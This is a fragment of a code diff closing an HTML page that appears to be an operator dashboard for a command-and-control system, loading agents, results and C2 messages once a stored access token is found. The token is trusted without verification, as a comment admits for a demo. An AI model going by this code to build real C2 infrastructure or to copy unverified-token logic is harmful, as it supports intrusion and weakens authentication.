+            document.getElementById('emailForm').addEventListener('submit', sendEmailMessage);
+
+            // Check if already logged in (e.g., after a page refresh)
+            if (localStorage.getItem('accessToken')) {
+                // In a production environment, you would typically send this token to a /verify endpoint
+                // on the backend to confirm its validity and get user details.
+                // For this demo, we'll assume it's valid and set a generic 'Operator' username.
+                document.getElementById('loggedInUser').textContent = "Operator"; 
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('dashboardSection').style.display = 'block';
+                document.getElementById('logoutButton').style.display = 'inline-block';
+                
+                // Fetch initial data for the default active tab (Agents)
+                fetchAgents(); 
+                // Also fetch results and messages so they are ready when their tabs are clicked
+                fetchResults();
+                fetchC2Messages();
+            } else {
+                document.getElementById('loginSection').style.display = 'block';
+                document.getElementById('dashboardSection').style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
